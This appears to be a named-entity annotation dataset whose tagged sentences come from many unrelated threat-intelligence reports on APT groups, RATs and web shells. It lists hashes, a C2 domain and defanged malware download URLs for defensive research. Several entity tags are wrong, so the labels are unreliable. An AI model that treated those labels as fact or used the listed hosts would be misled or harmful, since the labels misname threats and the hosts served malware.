--	O
--	O
--	O
--	O
--	O
--	O
--	O
--	O
--	O
--	O
--	O
--	O
--	O
--	O
--	O
--	O
--	O
--	O
-The	O
information	O
transmitted	O
,	O
including	O
any	O
content	O
in	O
this	O
communication	O
is	O
confidential	O
,	O
is	O
intended	O
only	O
for	O
the	O
use	O
of	O
the	O
intended	O
recipient	O
and	O
is	O
the	O
property	O
of	O
The	O
Western	O
Union	O
Company	O
or	O
its	O
affiliates	O
and	O
subsidiaries	O
.	O

This	O
link	O
was	O
made	O
through	O
finding	O
several	O
overlapping	O
IP	O
addresses	O
used	O
by	O
Mutter	B-malware.backdoor
and	O
Beebus	B-malware.backdoor
such	O
as	O
the	O
following	O
.	O

RemoteShell	O
:	O
Used	O
to	O
execute	O
remote	O
commands	O
received	O
from	O
the	O
attacker	O
on	O
the	O
infected	O
machine	O
.	O

ZxFunction001	O

AYRUNSC.exe	O
is	O
a	O
legitimate	O
and	O
digitally	O
signed	O
binary	O
created	O
by	O
ESTsoft	O
Corp	O
.	O

Among	O
its	O
technical	O
innovations	O
,	O
there	O
is	O
a	O
custom	O
file	O
system	O
to	O
execute	O
commands	O
in	O
a	O
stealthy	O
fashion	O
,	O
and	O
a	O
complex	O
task­	O
scheduling	O
module	O
working	O
in	O
a	O
similar	O
way	O
to	O
the	O
'	O
cron	O
'	O
Unix	O
command	O
.	O

with	O
the	O
key	O
.	O

•	O
Registry	O
key	O
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\	O
SystemInformation	O
,	O
value	O
names	O
:	O
SystemManufacturer	O
,	O
SystemProductName	O
.	O

XAttacker	O
:	O
Copy	O
of	O
XAttacker	O
PHP	O
remote	O
file	O
upload	O
script	O
.	O

Four	O
such	O
installers	O
were	O
identified	O
;	O
files	O
with	O
the	O
MD5	O
hash	O
of	O
:	O
0392fb51816dd9583f9cb206a2cf02d9	B-hash
,	O
(	O
original	O
name	O
)	O
e6d9fce2c6e766b0899ac2e1691b8097	B-hash
,	O
(	O
original	O
name	O
)	O
e013691e702778fa6dbc35b15555c3c2	B-hash
,	O
(	O
original	O
name	O
)	O
9d299d3a074f2809985e0317b9c461eb	B-hash
,	O
(	O
original	O
name	O
)	O
These	O
are	O
all	O
self-extracting	O
archives	O
(	O
WinRAR	O
SFX	O
RAR	O
and	O
SFX	O
ZIP	O
)	O
,	O
which	O
again	O
contain	O
lure	O
documents	O
and	O
a	O
malicious	O
Python	O
installer	O
.	O

Check	O
OS	O
version	O
:	O
.	O

For	O
some	O
Anti-Virus	O
software	O
this	O
even	O
appears	O
to	O
be	O
version	O
dependent	O
.	O

While	O
investigating	O
thlsystems.for rst.cz	O
we	O
discovered	O
that	O
the	O
webpage	O
belongs	O
to	O
a	O
legitimate	O
entity	O
,	O
suggesting	O
this	O
is	O
a	O
compromised	O
server	O
being	O
used	O
as	O
both	O
an	O
encrypted	O
backchannel	O
for	O
the	O
attacker	O
and	O
the	O
distribution	O
of	O
implants	O
.	O

Crowdstrike	O
presents	O
'	O
Mo	O
'	O
Shells	O
Mo	O
'	O
Problems	O
'	O
-	O
A	O
four	O
part	O
series	O
featuring	O
two	O
unique	O
web	O
shells	B-malware.backdoor
used	O
by	O
a	O
Chinese	O
threat	O
group	O
we	O
call	O
Deep	O
Panda	O
.	O

This	O
small	O
,	O
text-based	O
payload	O
can	O
be	O
delivered	O
using	O
any	O
of	O
the	O
following	O
mechanisms	O
:	O
•	O
WebDAV	O
file	O
upload	O
•	O
JBoss	O
jmx-console	O
or	O
Apache	O
Tomcat	O
management	O
pages	O
(	O
For	O
more	O
details	O
on	O
this	O
attack	O
vector	O
,	O
read	O
FireEye	O
consultant	O
Tony	O
Lee	O
's	O
explanation	O
)	O
•	O
Remote	O
exploit	O
with	O
a	O
file	O
drop	O
•	O
Lateral	O
propagation	O
from	O
other	O
access	O
After	O
examining	O
the	O
server-side	O
payload	O
and	O
the	O
client	O
used	O
to	O
control	O
the	O
Web	B-malware.ransom
shell	O
,	O
the	O
next	O
step	O
to	O
understanding	O
China	B-malware.backdoor
Chopper	I-malware.backdoor
is	O
observing	O
its	O
traffic	O
.	O

The	O
malware	O
authors	O
also	O
possess	O
an	O
interesting	O
understanding	O
of	O
execution	O
policies	O
which	O
they	O
leverage	O
to	O
manipulate	O
their	O
victim	O
systems	O
.	O

Why	O
do	O
you	O
call	O
it	O
Poseidon	B-malware.infosteal
's	O
Targeted	O
Attack	O
Boutique	O
?	O

Unfortunately	O
,	O
the	O
response	O
was	O
empty	O
and	O
it	O
is	O
not	O
possible	O
to	O
assess	O
what	O
may	O
have	O
been	O
delivered	O
.	O

We	O
compared	O
module	O
1	O
and	O
the	O
payload	O
generated	O
by	O
using	O
Beacon	O
,	O
and	O
found	O
only	O
the	O
following	O
different	O
data	O
:	O
the	O
Head	O
data	O
,	O
request	O
file	O
name	O
and	O
IP	O
address	O
.	O

FireEye	O
has	O
over	O
1,100	O
customers	O
across	O
more	O
than	O
40	O
countries	O
,	O
including	O
over	O
100	O
of	O
the	O
Fortune	O
500	O
.	O

The	O
macro	O
then	O
decodes	O
a	O
string	O
which	O
runs	O
PowerShell	O
script	O
to	O
download	O
malware	O
from	O
a	O
popular	O
university	O
site	O
located	O
in	O
Indonesia	O
as	O
shown	O
below	O
.	O

This	O
technique	O
exploits	O
a	O
security	O
vulnerability	O
found	O
in	O
legitimate	O
software	O
,	O
which	O
allows	O
the	O
attackers	O
to	O
load	O
a	O
fake	O
DLL	O
and	O
execute	O
its	O
malicious	O
code	O
.	O

Figure	O
28	O
:	O
Recursive	O
search	O
through	O
Windows	O
using	O
the	O
dir	O
command	O

Open	O
source	O
reporting	O
indicates	O
that	O
Ukrainian	O
artillery	O
forces	O
have	O
lost	O
over	O
50	O
%	O
of	O
their	O
weapons	O
in	O
the	O
2	O
years	O
of	O
conflict	O
and	O
over	O
80	O
%	O
of	O
D-30	O
howitzers	O
,	O
the	O
highest	O
percentage	O
of	O
loss	O
of	O
any	O
other	O
artillery	O
pieces	O
in	O
Ukraine	O
's	O
arsenal	O
.	O

1	O
.	O

Next	O
on	O
the	O
timeline	O
is	O
Babar64	B-malware.drop
,	O
allegedly	O
compiled	O
middle	O
of	O
2011	O
and	O
first	O
seen	O
on	O
VirusTotal	O
middle	O
of	O
2012	O
.	O

In	O
addition	O
to	O
identifying	O
targets	O
,	O
root9B	O
analysts	O
also	O
discovered	O
indicators	O
of	O
malware	O
,	O
the	O
analysis	O
of	O
which	O
revealed	O
several	O
zero-day	O
threats	B-malware.backdoor
and	O
their	O
corresponding	O
'	O
hashes	O
.	O
'	O

WADA-commissioned	O
report	O
documents	O
evidence	O
of	O
Russian	O
athletes	O
'	O
widespread	O
doping	O
.	O

Companies	O
attacked	O
by	O
Energetic	O
Bear/Crouching	O
Yeti	O
are	O
geographically	O
distributed	O
worldwide	O
with	O
a	O
more	O
obvious	O
concentration	O
in	O
Europe	O
and	O
the	O
US	O
.	O

In	O
other	O
words	O
,	O
it	O
will	O
convert	O
the	O
ASCII	O
representations	O
(	O
0x41	O
,	O
0x42	O
,	O
...	O
,	O
0x46	O
)	O
of	O
the	O
upper-case	O
letters	O
A	O
through	O
F	O

Business	O
Continuity	O
:	O
Are	O
we	O
able	O
to	O
sustain	O
business	O
operations	O
without	O
access	O
to	O
certain	O
systems	O
?	O

Last	O
Modified	O
by	O
:	O
Windows	O
ユーザー	O
(	O
Windows	O
user	O
)	O

The	O
requests	O
contain	O
minimal	O
HTTP	O
headers	O
since	O
the	O
PowerShell	O
command	O
is	O
executed	O
with	O
mostly	O
default	O
parameters	O
.	O

The	O
sender	O
is	O
associated	O
with	O
a	O
company	O
named	O
'	O
Combined	O
Freight	O
(	O
PVT	O
)	O
Limited	O
'	O
(	O
combinedfreight[.]com	B-url.unknown
)	O
Combined	O
Freight	O
(	O
PVT	O
)	O
Limited	O
is	O
freight	O
forwarding	O
company	O
which	O
is	O
into	O
ocean	O
&	O
air	O
freight	O
business	O
headquartered	O
in	O
Karachi	O
,	O
Pakistan	O
(	O
as	O
per	O
their	O
website	O
)	O
.	O

For	O
this	O
version	O
,	O
the	O
developer	O
modified	O
the	O
architecture	O
of	O
the	O
malware	O
.	O

The	O
list	O
of	O
APIs	O
to	O
hook	O
is	O
parted	O
in	O
three	O
groups	O
:	O
Internet	O
communication	O
File	O
creation	O
Media	O
Any	O
set	O
of	O
hooks	O
will	O
only	O
be	O
applied	O
to	O
a	O
defined	O
set	O
of	O
processes	O
.	O

Written	O
by	O
Sergei	O
Shevchenko	O
,	O
Hirman	O
Muhammad	O
bin	O
Abu	O
Bakar	O
,	O
and	O
James	O
Wong	O

Many	O
pieces	O
of	O
the	O
puzzle	O
are	O
still	O
missing	O
though	O
:	O
how	O
the	O
attackers	O
sent	O
the	O
fraudulent	O
transfers	O
;	O
how	O
the	O
malware	O
was	O
implanted	O
;	O
and	O
crucially	O
,	O
who	O
was	O
behind	O
this	O
.	O

DAT	O
files	O
VSE	O
BOP	O
Host	O
IPS	O
Coverage	O
is	O
provided	O
as	O
Roarur.dll	O
in	O
the	O
5862	O
DATs	O
,	O
released	O
January	O
15	O
.	O

Iranian	O
cyber	O
operations	O
are	O
administered	O
via	O
a	O
tiered	O
approach	O
,	O
where	O
an	O
ideologically	O
and	O
politically	O
trusted	O
group	O
of	O
middle	O
managers	O
translate	O
intelligence	O
priorities	O
into	O
segmented	O
cyber	O
tasks	O
which	O
are	O
then	O
bid	O
out	O
to	O
multiple	O
contractors	O
.	O

CozyDuke	B-malware.drop
may	O
use	O
multiple	O
techniques	O
for	O
establishing	O
persistence	O
;	O
the	O
following	O
is	O
one	O
technique	O
used	O
.	O

IHU	O
was	O
named	O
in	O
sanctions	O
by	O
the	O
U.S.	O
Treasury	O
'	O
for	O
providing	O
,	O
or	O
attempting	O
to	O
provide	O
technological	O
,	O
or	O
other	O
support	O
for	O
and	O
services	O
in	O
support	O
of	O
the	O
IRGC	O
.	O
'	O

These	O
documents	O
contain	O
topics	O
discussing	O
either	O
software	O
development	O
or	O
digital	O
currencies	O
.	O

In	O
March	O
2018	O
,	O
we	O
provided	O
a	O
detailed	O
analysis	O
of	O
another	O
campaign	O
that	O
bore	O
the	O
hallmarks	O
of	O
MuddyWater	O
.	O

Delete	O
Stop	O
Modify	O
Upload	O
Download	O

Figure	O
24	O
:	O
API	O
calls	O
to	O
retrieve	O
handle	O
file	O
name	O
in	O
mshta.exe	O
process	O

Phone	O
:	O
+1-888-282-08	O
7	O
0	O
Email	O
:	O
NCCICCustomerService@hq.dhs.gov	O

Anonymous	O
Poland	O
(	O
@	O
anpoland	O
)	O
.	O

The	O
batch	O
file	O
contains	O
the	O
following	O
commands	O
,	O
which	O
execute	O
PowerShell	O
scripts	O
(	O
marked	O
in	O
red	O
)	O
.	O

Biogas.exe	O

It	O
also	O
supports	O
HTTPS	O
and	O
the	O
usage	O
of	O
a	O
SOCKS5	O
,	O
SOCKS4a	O
or	O
SOCKS4	O
proxy	O
.	O

During	O
the	O
initial	O
login	O
request	O
,	O
the	O
3.6	O
version	O
of	O
Gh0st	B-malware.backdoor
RAT	I-malware.backdoor
enumerates	O
system	O
information	O
and	O
transmits	O
that	O
information	O
to	O
the	O
controller	O
.	O

It	O
then	O
sends	O
another	O
event	O
to	O
inject	O
in	O
to	O
the	O
following	O
Mac	O
system	O
processes	O
:	O
mdworker	O
SystemUIServer	O
Dock	O
loginwindow	O
UserEventAgent	O

The	O
samples	O
from	O
email	O
attachments	O
have	O
been	O
shared	O
with	O
selected	O
individuals	O
within	O
the	O
security	O
community	O
,	O
and	O
we	O
strongly	O
urge	O
antivirus	O
companies	O
and	O
security	O
researchers	O
to	O
continue	O
where	O
we	O
have	O
left	O
off	O
.	O

However	O
,	O
a	O
coincidence	O
seems	O
unlikely	O
,	O
and	O
CTU	O
researchers	O
suspect	O
that	O
TG-4127	B-malware.infosteal
used	O
the	O
spearphishing	O
emails	O
or	O
similar	O
techniques	O
to	O
gain	O
an	O
initial	O
foothold	O
in	O
the	O
DNC	O
network	O
.	O

The	O
ShellMain	O
function	O
is	O
a	O
stub	O
that	O
relocates	O
the	O
DLL	O
to	O
another	O
buffer	O
and	O
spawns	O
a	O
thread	O
that	O
starts	O
from	O

Spearphishing	O
and	O
.rar	O
Attachments	O
with	O
RTLO	O

,	O
etc	O
)	O
.	O

During	O
that	O
proposed	O
development	O
timeframe	O
,	O
a	O
number	O
of	O
significant	O
events	O
unfolded	O
between	O
Ukraine	O
,	O
Russia	O
,	O
and	O
the	O
international	O
community	O
.	O

The	O
exploit	O
code	O
used	O
by	O
the	O
original	O
attackers	O
was	O
quickly	O
improved	O
and	O
added	O
to	O
Metasploit	O
thus	O
greatly	O
expanding	O
the	O
potential	O
number	O
of	O
attackers	O
and	O
reliability	O
of	O
code	O
.	O

Warning	O
:	O
Many	O
of	O
these	O
websites	O
may	O
still	O
be	O
compromised	O
and	O
present	O
a	O
risk	O
to	O
visitors	O
.	O

Figure	O
26	O
.	O

Figure	O
8	O

SPLM	B-malware.backdoor
full	O
backdoor	O
and	O
plugins	O
crypto	O
and	O
strings	O
v4	O

This	O
page	O
used	O
to	O
offer	O
no-ip	O
type	O
hosting	O
and	O
was	O
widely	O
used	O
by	O
malware	O
authors	O
.	O

This	O
indicates	O
that	O
Bank	O
of	O
America	O
,	O
is	O
among	O
the	O
probable	O
targets	O
.	O

An	O
international	O
organization	O
that	O
monitors	O
human	O
rights	O
,	O
counter-terrorism	O
and	O
cyberattacks	O
on	O
critical	O
infrastructure	O
in	O
the	O
Ukraine	O
.	O

At	O
this	O
point	O
,	O
we	O
can	O
guess	O
that	O
stable_var_41C	O
is	O
going	O
to	O
play	O
the	O
role	O
of	O
a	O
substitution	O
table	O
for	O
decrypting	O
the	O
source	O
buffer	O
src_buf_var_4	O
,	O
so	O
let	O
's	O
see	O
how	O
DarkComet	B-malware.backdoor
builds	O
this	O
table	O
.	O

PLCSIM	O
is	O
used	O
to	O
test	O
PLC	O
program	O
functionality	O
prior	O
to	O
in-field	O
deployment	O
.	O

CozyDuke	B-malware.drop
main	O
component	O
820KB	O
DLL	O
Encrypted	O
strings	O
Encrypted	O
external	O
configuration	O

Requested	O
ransom	O
decreased	O
from	O
0.2	O
BTC	O
to	O
0.05	O
BTC	O
,	O
most	O
likely	O
due	O
to	O
the	O
lack	O
of	O
payment	O
they	O
received	O
.	O

JRat	B-malware.backdoor
also	O
employs	O
anti-virtualization	O
features	O
to	O
detect	O
and	O
shut	O
down	O
if	O
it	O
is	O
being	O
run	O
in	O
VirtualBox	O
,	O
VMware	O
,	O
or	O
other	O
virtualization	O
software	O
.	O

This	O
Trojan	O
is	O
in	O
the	O
same	O
malware	O
family	O
as	O
the	O
Trojan	O
found	O
on	O
an	O
Angolan	O
activist	O
's	O
computer	O
at	O
the	O
Oslo	O
Freedom	O
Forum	O
in	O
2013—which	O
was	O
also	O
linked	O
to	O
Appin	O
by	O
researchers	O
at	O
ESET	O
and	O
Norman	O
Security	O
.	O

Claiming	O
to	O
support	O
'	O
fair	O
play	O
and	O
clean	O
sport	O
,	O
'	O
Fancy	O
Bears	O
'	O
Hack	O
team	O
calls	O
TUEs	O
'	O
licenses	O
for	O
doping	O
.	O
'	O

Once	O
unpacked	O
it	O
drops	O
a	O
known	O
malware	O
variant	O
,	O
which	O
has	O
been	O
seen	O
as	O
part	O
of	O
the	O
Lazarus	O
group	O
's	O
toolkit	O
in	O
other	O
cases	O
over	O
the	O
past	O
year	O
.	O

We	O
are	O
willing	O
to	O
share	O
additional	O
information	O
with	O
the	O
security	O
community	O
.	O

Generally	O
,	O
they	O
are	O
masqueraded	O
with	O
fake	O
Flash	O
Player	O
,	O
Office	O
document	O
,	O
or	O
PDF	O
document	O
icons	O
.	O

We	O
named	O
this	O
family	O
of	O
malware	O
IRONGATE	B-malware.backdoor
.	O

Since	O
they	O
first	O
emerged	O
back	O
in	O
2007	O
with	O
a	O
series	O
of	O
cyberespionage	O
attacks	O
against	O
the	O
South	O
Korean	O
government	O
,	O
these	O
threat	O
actors	O
have	O
successfully	O
managed	O
to	O
pull	O
off	O
some	O
of	O
the	O
most	O
notable	O
and	O
devastating	O
targeted	O
attacks—such	O
as	O
the	O
widely-reported	O
2014	O
Sony	O
hack	O
and	O
the	O
2016	O
attack	O
on	O
a	O
Bangladeshi	O
bank—in	O
recent	O
history	O
.	O

Speci cally	O
,	O
we	O
chose	O
ten	O
APT	B-malware.unknown
campaigns	O
,	O
--	O
some	O
of	O
which	O
were	O
already	O
covered	O
in	O
the	O
Usenix	O
paper	O
.	O

Hash	O

Once	O
the	O
user	O
name	O
and	O
password	O
is	O
generated	O
,	O
malware	O
then	O
creates	O
an	O
XML	O
file	O
(	O
SQLITE.xml	O
)	O
and	O
populates	O
the	O
XML	O
file	O
with	O
the	O
generated	O
user	O
name	O
and	O
password	O
.	O

םיברק	O
םילמנ	O

It	O
appears	O
the	O
attacker	O
is	O
using	O
parts	O
of	O
a	O
domain	O
that	O
belong	O
to	O
the	O
South	O
Korean	O
Ministry	O
of	O
Agriculture	O
and	O
Forestry	O
,	O
which	O
is	O
in	O
line	O
with	O
the	O
attached	O
document	O
name	O
in	O
the	O
email	O
,	O
but	O
this	O
domain	O
has	O
nothing	O
to	O
do	O
with	O
this	O
government	O
agency	O
.	O

This	O
blog	O
post	O
describes	O
another	O
attack	O
campaign	O
where	O
attackers	O
impersonated	O
identity	O
of	O
Indian	O
think	O
tank	O
IDSA	O
(	O
Institute	O
for	O
Defence	O
Studies	O
and	O
Analyses	O
)	O
and	O
sent	O
out	O
spear-phishing	O
emails	O
to	O
target	O
officials	O
of	O
the	O
and	O
possibly	O
the	O
officials	O
of	O
IDSA	O
(	O
Institute	O
for	O
Defence	O
Studies	O
and	O
Analyses	O
)	O
is	O
an	O
Indian	O
think	O
tank	O
for	O
advanced	O
research	O
in	O
international	O
relations	O
,	O
especially	O
strategic	O
and	O
security	O
issues	O
,	O
and	O
also	O
trains	O
civilian	O
and	O
military	O
officers	O
of	O
the	O
Government	O
of	O
India	O
and	O
deals	O
with	O
objective	O
research	O
and	O
policy	O
relating	O
to	O
all	O
aspects	O
of	O
defense	O
and	O
National	O
security	O
.	O

-	O
>	O
|	O
nt	O
authority\network	O
service	O
[	O
S	O
]	O
C	O
:	O
\Inetpub\wwwroot	O
[	O
E	O
]	O
|	O
<	O
-	O

1	O
)	O
Type	O
of	O
Processor	O
2	O
)	O
CPU	O
Speed	O
3	O
)	O
Figures	O
out	O
the	O
product	O
type	O
by	O
querying	O
the	O
\SYSTEM\CurrentControlSet\Control\ProductOptions\ProductType	O
registry	O
key	O
.	O

The	O
configuration	O
information	O
is	O
encoded	O
.	O

We	O
also	O
observed	O
clues	O
that	O
the	O
attackers	O
are	O
interested	O
in	O
cryptocurrencies	O
such	O
as	O
Bitcoin	O
(	O
BTC	O
)	O
and	O
Ant	O
Share	O
(	O
NEO	O
)	O
.	O

Routinely	O
evaluate	O
known	O
and	O
published	O
vulnerabilities	O
,	O
perform	O
software	O
updates	O
and	O
technology	O
refreshes	O
periodically	O
,	O
and	O
audit	O
external-facing	O
systems	O
for	O
known	O
Web	O
application	O
vulnerabilities	O
.	O

0AA7B256D2DCC8BD3914F895B134B225	B-hash
hint.zapto.org	B-url.cncsvr

Incident	O
?	O

del_task	O
Delete	O
a	O
file	O
.	O

Registry	O
Persistence	O
Key	O
Registry	O
Key	O
Value	O

Then	O
there	O
is	O
the	O
dll	O
install	O
name	O
,	O
the	O
domain	O
,	O
and	O
the	O
port	O
.	O

The	O
values	O
are	O
then	O
decrypted	O
using	O
the	O
system	O
library	O
It	O
also	O
steals	O
login	O
credential	O
from	O
IE	O
autocomplete	O
entries	O
.	O

APT12	O
′	O
s	O
targets	O
are	O
consistent	O
with	O
larger	O
People	O
's	O
Republic	O
of	O
China	O
(	O
PRC	O
)	O
goals	O
.	O

The	O
optional	O
HTTP	O
data	O
with	O
king.jpg	O
looks	O
like	O
a	O
beacon	O
to	O
inform	O
the	O
control	O
server	O
that	O
the	O
malware	O
is	O
ready	O
to	O
accept	O
new	O
commands	O
:	O
Commands	O
received	O
from	O
the	O
control	O
server	O
are	O
encoded	O
DWORDs	O
After	O
decoding	O
,	O
these	O
DWORDs	O
should	O
be	O
in	O
the	O
range	O
123459h	O
to	O
123490h	O
Malware	O
checking	O
to	O
make	O
sure	O
a	O
received	O
command	O
is	O
in	O
the	O
correct	O
range	O
.	O

XtremeRAT	B-malware.backdoor
's	O
key	O
scheduling	O
algorithm	O
(	O
KSA	O
)	O
implementation	O
contains	O
a	O
bug	O
wherein	O
it	O
only	O
considers	O
the	O
length	O
of	O
the	O
key	O
string	O
,	O
not	O
including	O
the	O
null	O
bytes	O
between	O
each	O
character	O
,	O
as	O
is	O
found	O
in	O
these	O
Unicode	O
strings	O
.	O

field	O
specifies	O
the	O
specific	O
command	O
that	O
the	O
client	O
is	O
requesting	O
the	O
server	O
variant	O
perform	O
.	O

1	O
.	O

This	O
technique	O
is	O
also	O
used	O
by	O
other	O
APTs	O
as	O
persistence	O
mechanisms	O
,	O
as	O
documented	O
by	O
our	O
Mandiant	O
colleagues	O
.	O

As	O
demonstrated	O
by	O
our	O
work	O
on	O
the	O
Freegate	B-malware.backdoor
malware	O
,	O
as	O
well	O
as	O
the	O
Green	O
Simurgh	O
case	O
,	O
these	O
vulnerabilities	O
are	O
exploited	O
with	O
serious	O
consequences	O
for	O
high-risk	O
users	O
.	O

The	O
payload	O
pairs	O
several	O
comma-separated	O
lists	O
of	O
characters	O
with	O
comma-separated	O
lists	O
of	O
numbers	O
.	O

SyLog.bin	O
(	O
SHA1	O
:	O
5689448b4b6260ec9c35f129df8b8f2622c66a45	B-hash
,	O
encrypted	O
backdoor	O
)	O

Replace	O
or	O
modify	O
services	O
so	O
that	O
all	O
user	O
credentials	O
are	O
passed	O
through	O
an	O
encrypted	O
channel	O
.	O

This	O
effectively	O
means	O
that	O
the	O
malware	O
writer	O
mistakenly	O
coded	O
the	O
bot	O
to	O
save	O
user	O
information	O
into	O
the	O
wrong	O
file	O
.	O

Unloads	O
ZxShell	B-malware.backdoor
and	O
deletes	O
all	O
of	O
the	O
active	O
components	O
.	O

The	O
dropper	O
has	O
an	O
embedded	O
DLL	O
that	O
is	O
decompressed	O
to	O
the	O
windows	O
system32	O
directory	O
.	O

This	O
handle	O
is	O
then	O
used	O
in	O
the	O
keyboard	O
hook	O
procedure	O
.	O

In	O
order	O
to	O
evade	O
forensics	O
,	O
the	O
fi	O
le-time	O
of	O
the	O
dropped	O
DLL	O
will	O
be	O
modifi	O
ed	O
to	O
match	O
that	O
of	O
an	O
existing	O
system	O
DLL	O
(	O
user32.dll	O
,	O
etc	O
)	O
.	O

Audit	O
existing	O
firewall	O
rules	O
and	O
close	O
all	O
ports	O
that	O
are	O
not	O
explicitly	O
needed	O
for	O
business	O
.	O

f9a669d22866cd041e2d520c5eb093188962bea8864fdfd0c0abb2b254e9f197	B-hash

You	O
might	O
ask	O
,	O
why	O
conduct	O
Flash	B-malware.backdoor
exploitation	O
within	O
Microsoft	O
Office	O
?	O

It	O
also	O
collects	O
locally-stored	O
stolen	O
data	O
and	O
uploads	O
it	O
to	O
Dropbox	O
.	O

Skilled	O
hackers	O
with	O
substantial	O
financial	O
resources	O
carried	O
out	O
Operation	O
BugDrop	O
.	O

Since	O
our	O
last	O
post	O
there	O
have	O
been	O
several	O
alterations	O
to	O
the	O
ScanBox	B-malware.infosteal
code	O
base	O
,	O
including	O
new	O
modules	O
,	O
changes	O
to	O
avoid	O
signature	O
based	O
detection	O
,	O
as	O
well	O
as	O
extra	O
techniques	O
to	O
try	O
to	O
identify	O
whether	O
those	O
being	O
scanned	O
are	O
real	O
machines	O
or	O
researchers	O
.	O

This	O
DLL	O
also	O
contains	O
the	O
basic	O
export	O
functions	O
of	O
DllRegisterServer	O
and	O
DllUnregisterServer	O
.	O

In	O
more	O
recent	O
activity	O
,	O
these	O
spear-phishing	O
attacks	O
are	O
now	O
a	O
two-stage	O
process	O
.	O

1	O
.	O

The	O
traditional	O
approach	O
relies	O
on	O
the	O
principles	O
of	O
segregation	O
for	O
both	O
communication	O
infrastructures	O
and	O
control	O
strategies	O
.	O

The	O

Kaspersky	O
products	O
detect	O
flash	O
exploit	O
as	O
HEUR:Exploit.SWF.Agent.gen	B-malware.infosteal
also	O
our	O
AEP	O
(	O
Automatic	O
Exploit	O
Prevention	O
)	O
component	O
can	O
successfully	O
detect	O
this	O
attack	O
.	O

In	O
most	O
cases	O
that	O
we	O
have	O
observed	O
,	O
the	O
group	O
performed	O
tasks	O
related	O
to	O
searching	O
for	O
vulnerabilities	O
,	O
gaining	O
persistence	O
on	O
various	O
hosts	O
,	O
and	O
stealing	O
authentication	O
data	O
.	O

case	O
'	O
u	O
'	O
:	O

Server	O
Uranio6	O

An	O
attacker	O
may	O
exploit	O
this	O
issue	O
to	O
execute	O
remote	O
code	O
.	O

T	O
ur	O
ke	O
y	O
T	O
ur	O
ke	O
y	O
Gr	O
e	O
e	O
ce	O
Gr	O
e	O
e	O
ce	O
US	O
AUS	O
A	O

Curiously	O
,	O
the	O
sites	O
scanned	O
included	O
a	O
web	O
developer	O
's	O
website	O
,	O
kashey.ru	O
,	O
and	O
resources	O
links	O
to	O
which	O
were	O
found	O
on	O
this	O
site	O
.	O

The	O
targets	O
almost	O
perfectly	O
fall	O
into	O
their	O
sphere	O
of	O
interest	O
.	O

By	O
using	O
this	O
name	O
,	O
the	O
intention	O
was	O
to	O
disguise	O
itself	O
as	O
the	O
Windows	O
thumbnail	O
cache	O
.	O

Web	O
.	O

The	O
new	O
campaign	O
marks	O
the	O
first	O
APT12	O
activity	O
publicly	O
reported	O
since	O
Arbor	O
Networks	O
released	O
their	O
blog	O
'	O
Illuminating	O
The	O
Etumbot	B-malware.backdoor
APT	O
Backdoor	O
.	O
'	O

One	O
example	O
of	O
the	O
conflict	O
between	O
ideology	O
and	O
skill	O
was	O
Mohammad	O
Hussein	O
Tajik	O
,	O
a	O
former	O
cyber	O
commander	O
within	O
the	O
IRGC	O
.	O

Any	O
dynamic	O
DNS	O
domains	O
that	O
resolve	O
to	O
non-routable	O
IP	O
addresses	O
,	O
like	O
127.0.0.1	B-ip.unknown
or	O
private	O
IP	O
addresses	O
,	O
should	O
be	O
thoroughly	O
investigated	O
.	O

The	O
domain	O
download-mgrwin[.]com	B-url.cncsvr
which	O
shared	O
the	O
IP	O
81.4.125.90	B-ip.unknown
with	O
techto-earth[.]com	B-url.cncsvr
was	O
also	O
found	O
to	O
host	O
similar	O
malware	O
:	O
hxxp://download-mgrwin[.]com/southside/download1/stisvc.exe	B-url.cncsvr
md5	O
6ec82e9eccb9bee050c9f7f2750d0c7c	B-hash
hxxp://download-mgrwin[.]com/southside/download1/sppsvc.exe	B-url.cncsvr
md5	O
acfada8e91eda6cca2da66bbb032d924	B-hash
hxxp://download-mgrwin[.]com/eastside/download/sppsvc.exe	B-url.cncsvr
md5	O
6dc9eee24f8d5cba1ca3919b87507d86	B-hash
Domain	O
registration	O
information	O
is	O
useful	O
for	O
connecting	O
cases	O
.	O

Country	O
Sector/Target	O

The	O
locations	O
of	O
Inception	B-malware.backdoor
's	O
targets	O
have	O
shifted	O
since	O
2014	O
,	O
but	O
the	O
group	O
continues	O
to	O
have	O
a	O
global	O
reach	O
.	O

This	O
payload	O
DLL	O
has	O
the	O
filename	O
and	O
is	O
named	O
after	O
IEC	O
101	O
(	O
aka	O

The	O
Mevade	B-malware.unknown
C	O
&	O
C	O
name	O
styles	O
as	O
well	O
as	O
some	O
other	O
technical	O
similarities	O
indicated	O
a	O
connection	O
to	O
RedOctober	B-malware.unknown
,	O
but	O
the	O
link	O
was	O
weak	O
.	O

Common	O
directory	O
names	O
:	O
system	O
,	O
current	O
,	O
temporary	O
directories	O
.	O

The	O
information	O
stealer	O
was	O
capable	O
of	O
stealing	O
the	O
contents	O
of	O
the	O
clipboard	O
,	O
taking	O
screenshots	O
,	O
recording	O
keystrokes	O
and	O
stealing	O
 les	O
and	O
user	O
credentials	O
.	O

With	O
rare	O
exceptions	O
,	O
the	O
group	O
's	O
members	O
get	O
by	O
with	O
publicly	O
available	O
tools	O
.	O

This	O
new	O
ransomware	O
was	O
detected	O
by	O
ESET	O
products	O
as	O
Win32/Filecoder.NKH	O
.	O

Our	O
analysts	O
compared	O
sample	O
module	O
2	O
and	O
relevant	O
files	O
of	O
Beacon	O
,	O
and	O
found	O
that	O
the	O
disassembling	O
commands	O
between	O
them	O
are	O
exactly	O
the	O
same	O
with	O
exception	O
of	O
functionality	O
code	O
,	O
including	O
XOR	O
encryption	O
at	O
the	O
entry	O
,	O
downloading	O
system	O
DLL	O
,	O
obtaining	O
function	O
address	O
,	O
function	O
calling	O
modes	O
and	O
so	O
on	O
.	O

XtremeRAT	B-malware.backdoor
controller	O
connection	O
settings	O
In	O
the	O
Figure	O
5	O
,	O
the	O
attacker	O
specified	O
custom	O
CnC	O
servers	O
and	O
ports	O
and	O
changed	O
the	O
default	O
password	O
to	O
'	O
1411	O
'	O
.	O

T	O
he	O
following	O
malicious	O
php	O
files	O
were	O
found	O
in	O
different	O
directories	O
in	O
the	O
nginx	O
folder	O
and	O
in	O
a	O
working	O
directory	O
created	O
by	O
the	O
attackers	O
on	O
an	O
infected	O
web	O
servers	O
:	O

Next	O
,	O
the	O
Execute	O
(	O
)	O
function	O
will	O
execute	O
any	O
value	O
returned	O
by	O
the	O
lookup	O
.	O

©	O
AhnLab	O
,	O
Inc	O
.	O

TREND	O
MICRO	O
LEGAL	O
DISCLAIMERThe	O
information	O
provided	O
herein	O
is	O
for	O
general	O
information	O
and	O
educational	O
purposes	O
